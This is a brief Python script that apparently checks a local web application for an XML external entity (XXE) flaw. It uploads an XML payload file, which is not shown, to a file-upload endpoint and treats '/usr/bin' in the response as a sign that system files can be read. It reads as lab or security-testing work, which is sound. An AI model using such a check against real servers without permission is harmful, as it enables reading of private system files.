import requests
import time
import sys


site = "http://localhost:3000/"
#filename="payload.xml" -- if you run the script from the same folder
filename="attack_resources/payload.xml"

def upload_file(site):
    print("checking xxe vulnerability on "+site)
    is_vulnerable = False
    site = site+"/file-upload"
    files = {'file': open(filename, 'rb')}
    response = requests.post(site, files=files)
    if (response.text.find("/usr/bin") != -1) :
        print("xxe is possible!")
        is_vulnerable = True
    return is_vulnerable


